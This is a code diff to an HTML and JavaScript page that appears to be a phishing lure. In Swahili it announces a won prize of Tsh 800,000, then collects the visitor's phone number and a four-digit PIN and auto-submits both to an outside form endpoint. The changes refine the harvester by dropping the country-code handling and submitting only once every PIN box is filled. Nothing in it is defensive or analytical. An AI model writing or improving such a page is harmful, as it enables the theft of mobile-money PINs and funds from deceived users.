@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Umejishindia Ofa</title>
-    <!-- Link to the external CSS file -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -16,12 +15,10 @@
             <h1>Tsh 800,000</h1>
         </div>
         
-        <!-- The form now points to your Formbold endpoint -->
         <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
             
-            <!-- UPDATED: Using your new class name and structure -->
             <div class="phone-input">
-                <span class="country-code">+255</span>
+                <!-- REMOVED: The +255 span -->
                 <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="9" required>
             </div>
 
@@ -33,7 +30,6 @@
                 <input type="tel" maxlength="1" class="pin-box" data-index="3" required>
             </div>
 
-            <!-- Hidden input to hold the combined PIN for submission -->
             <input type="hidden" id="pin" name="pin">
         </form>
 
@@ -47,25 +43,23 @@
         const hiddenPinInput = document.getElementById('pin');
         const phoneNumberInput = document.getElementById('phoneNumber');
 
-        // Function to format the phone number before submission
-        const formatPhoneNumber = () => {
-            const fullNumber = '+255' + phoneNumberInput.value;
-            return fullNumber;
-        };
-
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 // Only allow numbers
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
 
                 if (e.target.value.length === 1) {
+                    // Move to the next box
                     if (index < pinBoxes.length - 1) {
                         pinBoxes[index + 1].focus();
                     } else {
-                        updateHiddenPin();
-                        // Update the phone number value to the full format before submitting
-                        phoneNumberInput.value = formatPhoneNumber();
-                        form.submit();
+                        // If this is the last box, check if all are filled
+                        const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
+                        if (allPinsFilled) {
+                            updateHiddenPin();
+                            // REMOVED: The code that added +255 back
+                            form.submit();
+                        }
                     }
                 }
                 updateHiddenPin();
